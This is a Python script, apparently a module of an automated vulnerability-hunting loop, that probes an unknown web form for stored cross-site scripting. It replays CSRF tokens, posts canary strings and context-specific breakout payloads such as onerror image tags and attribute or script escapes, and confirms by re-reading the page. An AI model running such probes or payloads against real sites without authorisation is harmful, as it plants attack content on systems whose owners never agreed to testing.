#!/usr/bin/env python3
"""Generic STORED-XSS probe for an UNKNOWN POST sink.

Rule #88: the one loop hunts targets it has never seen — this probe
takes the sink spec from its marker argv (the loop encodes it there so
_probe_cmd needs no changes):

    MARKER = PLOOP88|<target_base>|<path>|POST|<p1,p2>

Every generic XSS probe so far (Rule #56 xss, #74 cookie, #80 json,
#82 header, #83 path) tests IMMEDIATE reflection — inject, read the
same response. A real human hunter also injects and comes back LATER:
comment fields, guestbooks, profile bios, admin queues. This probe
tests PERSISTENCE: the canary counts only when a FRESH GET — after
the POST round-trip is over — still carries it raw.

Flow (stdlib only):
  1. GET the sink page (must be 200, read-only); find the POST form
     whose inputs cover the sink params (same form mechanics as the
     Rule #61 CSRF probe: token-like hidden fields are read and
     re-sent so the submit is a legitimate one).
  2. INJECTION TEST, one param at a time: POST the detection token
     (run-unique nonce + markup chars, GX88R<b>QZ shape) into the
     param, benign values elsewhere, then FRESH GET the sink page.
     If the RAW token persists on the fresh GET, the param is a
     stored-reflection candidate. Escaped-only persistence is the
     negative control -> keep looking. Reflection inside the POST
     response itself never counts (that is an XSS signal, not
     persistence).
  3. CONTEXT CLASSIFICATION (Rule #59, classifier copied verbatim
     from probe_sink_xss): comment / js-dq / js-sq / style (Rule #60)
     / attr-dq / attr-sq / attr-unquoted / text.
  4. CONFIRMATION: POST the context-specific breakout payload
     (executable-shaped, Rule #73), FRESH GET again. The full payload
     reflecting UNESCAPED on the fresh GET == stored breakout ==
     CONFIRMED (EVIDENCE cites via=<context>). Ungrounded contexts
     (js-unknown, tag-unknown) -> PROBE_NOTE + FAILED (fail-closed,
     never claim on an ungrounded context).

The detection token and the confirm payload both carry a run-unique
os.urandom nonce (Rule #81 independent reconfirm: the wrapper's
second run injects a DIFFERENT nonce, so both confirmations prove a
repeatable injection, not one stale row). Any exception ->
PROBE_ERROR + VERDICT: FAILED (fail-closed).
"""
import html
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 15

_TOKEN_RE = re.compile(r"csrf|_csrf|token|nonce|authenticity|xsrf",
                       re.IGNORECASE)


def _fetch(url, data=None, headers=None):
    req = urllib.request.Request(url, data=data,
                                 headers=headers or {"User-Agent": "PLOOP88"})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        # A 4xx/5xx is a server ANSWER, not a transport failure — the
        # probe reads the code (a 403 on submit is a signal, not a
        # crash).
        return e.code, e.read().decode("utf-8", "replace")


def _is_token_name(name):
    return bool(_TOKEN_RE.search(name or ""))


def _find_post_form(body, params):
    """First POST <form> whose inputs cover at least one sink param."""
    for fmatch in re.finditer(r"<form\b([^>]*)>(.*?)</form>", body,
                              re.IGNORECASE | re.DOTALL):
        attrs, inner = fmatch.group(1), fmatch.group(2)
        mm = re.search(r"method=['\"]([^'\"]*)", attrs, re.IGNORECASE)
        if (mm.group(1) if mm else "GET").upper() != "POST":
            continue
        names = re.findall(r"name=['\"]([^'\"]+)", inner, re.IGNORECASE)
        if not any(p in names for p in params):
            continue
        tokens = {}
        for im in re.finditer(
                r"<input\b([^>]*type=['\"]hidden['\"][^>]*)>", inner,
                re.IGNORECASE):
            iattrs = im.group(1)
            nm = re.search(r"name=['\"]([^'\"]+)", iattrs, re.IGNORECASE)
            vm = re.search(r"value=['\"]([^'\"]*)", iattrs, re.IGNORECASE)
            if nm and _is_token_name(nm.group(1)):
                tokens[nm.group(1)] = vm.group(1) if vm else ""
        return names, tokens
    return None, None


def _classify_context(body, token):
    """Where does the RAW token sit in the response? (Rule #59)"""
    idx = body.find(token)
    if idx < 0:
        return None
    before = body[:idx]
    # 1. HTML comment: nearest <!-- before the token with no closing -->
    last_open = before.rfind("<!--")
    if last_open != -1 and "-->" not in before[last_open:]:
        return "comment"
    # 2. inside a tag's attribute? The nearest '<' before the token must
    #    have NO '>' between it and the token (an unclosed tag).
    lt = before.rfind("<")
    if lt != -1 and ">" not in before[lt:idx]:
        tag_tail = before[lt:]
        if re.search(r'=\s*"[^"]*$', tag_tail):
            return "attr-dq"
        if re.search(r"=\s*'[^']*$", tag_tail):
            return "attr-sq"
        if re.search(r"=\s*[^\s>\"']*$", tag_tail):
            return "attr-unquoted"
        return "tag-unknown"  # in a tag, but no grounded breakout
    # 3. inside <script> element content?
    ls = before.lower().rfind("<script")
    if ls != -1 and "</script" not in before[ls:].lower():
        tail = before.rstrip()
        if tail.endswith('"'):
            return "js-dq"
        if tail.endswith("'"):
            return "js-sq"
        return "js-unknown"  # in script, but no grounded breakout
    # 3b. inside <style> element content? (Rule #60)
    lst = before.lower().rfind("<style")
    if lst != -1 and "</style" not in before[lst:].lower():
        return "style"
    # 4. default: element text node
    return "text"


def _confirm_payload(context, psuffix):
    p = "G88P" + psuffix
    # Rule #73: executable-shaped (onerror=) so the pipeline's
    # xss-reflect signal fires on the real reflected content.
    return {
        "text": p + "<img src=x onerror=" + p + ">",
        "attr-dq": p + '" onGX88over="1',
        "attr-sq": p + "' onGX88over='1",
        "attr-unquoted": p + ' onGX88over="1',
        "js-dq": p + '";G88C//',
        "js-sq": p + "';G88C//",
        "comment": p + "-->",
        "style": p + "</style><img src=x onerror=" + p + ">",
    }.get(context)


def main():
    # argv[1] is the marker: the _probe_cmd wrapper invokes
    #   python3 "$DST" "$MK"   (DST=argv[0], marker=argv[1])
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP88"
    try:
        _, tb_q, path_q, method, params_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    params = [p for p in params_csv.split(",") if p]
    method = (method or "GET").upper()
    if not tb or not path.startswith("/") or not params or \
            method != "POST":
        print("PROBE_ERROR invalid sink spec (stored-XSS needs a POST sink)")
        print("VERDICT: FAILED")
        return
    msuffix = re.sub(r"[^A-Za-z0-9]", "", marker.split("|", 1)[0])[:12]
    nonce = os.urandom(4).hex()
    print("RUN_NONCE %s" % nonce)

    # 1. sink page must exist (read-only); find the POST form.
    try:
        code, page = _fetch(tb.rstrip("/") + path)
    except Exception as e:
        print("PROBE_ERROR sink page fetch failed: %s" % e)
        print("VERDICT: FAILED")
        return
    if code != 200:
        print("PROBE_ERROR sink page status %s" % code)
        print("VERDICT: FAILED")
        return
    names, tokens = _find_post_form(page, params)
    if names is None:
        print("PROBE_ERROR no POST form covering the sink params")
        print("VERDICT: FAILED")
        return
    canary_params = [p for p in params if not _is_token_name(p)]
    if not canary_params:
        print("PROBE_NOTE sink carries only token fields — nothing to "
              "inject (fail-closed)")
        print("VERDICT: FAILED")
        return
    url = tb.rstrip("/") + path

    def _post(fields):
        data = urllib.parse.urlencode(fields).encode()
        return _fetch(url, data=data)

    def _fresh_get():
        _, fresh = _fetch(url)
        return fresh

    # 2. injection test, one param at a time. The canary counts ONLY on
    # the FRESH GET — persistence, not reflection.
    vuln_param = None
    vuln_body = None
    try:
        for param in canary_params:
            token = "GX88R%s%s<b>QZ" % (msuffix, nonce)
            fields = {p: ("benign" if p != param else token)
                      for p in canary_params}
            fields.update(tokens)
            _post(fields)
            fresh = _fresh_get()
            if token in fresh:
                vuln_param = param
                vuln_body = fresh
                break
            if html.escape(token) in fresh:
                print("PROBE_NOTE param %s persists ESCAPED only "
                      "(negative control)" % param)
    except Exception as e:
        print("PROBE_ERROR injection test failed: %s" % e)
        print("VERDICT: FAILED")
        return
    if not vuln_param:
        print("VERDICT: FAILED")
        return

    # 3. context classification (Rule #59)
    context = _classify_context(vuln_body, token)
    print("EVIDENCE sink=%s method=POST param=%s persistence=STORED "
          "reflection=RAW context=%s marker=%s" % (path, vuln_param,
                                                   context, msuffix))

    # 4. confirmation with the context-specific breakout payload. The
    # payload carries the run nonce: the fresh GET must show THIS
    # run's injection, not a stale row.
    payload = _confirm_payload(context, msuffix + nonce)
    if payload is None:
        print("PROBE_NOTE context %s has no grounded breakout payload "
              "(fail-closed)" % context)
        print("VERDICT: FAILED")
        return
    fields = {p: ("benign" if p != vuln_param else payload)
              for p in canary_params}
    fields.update(tokens)
    try:
        _post(fields)
        fresh2 = _fresh_get()
    except Exception as e:
        print("PROBE_ERROR confirm submit failed: %s" % e)
        print("VERDICT: FAILED")
        return
    if payload in fresh2:
        print("EVIDENCE sink=%s method=POST param=%s via=%s payload "
              "persisted UNESCAPED on fresh GET: %s" % (path, vuln_param,
                                                        context, payload))
        print("VERDICT: CONFIRMED")
    else:
        print("PROBE_NOTE confirm payload not persisted raw "
              "(context=%s)" % context)
        print("VERDICT: FAILED")


if __name__ == "__main__":
    main()
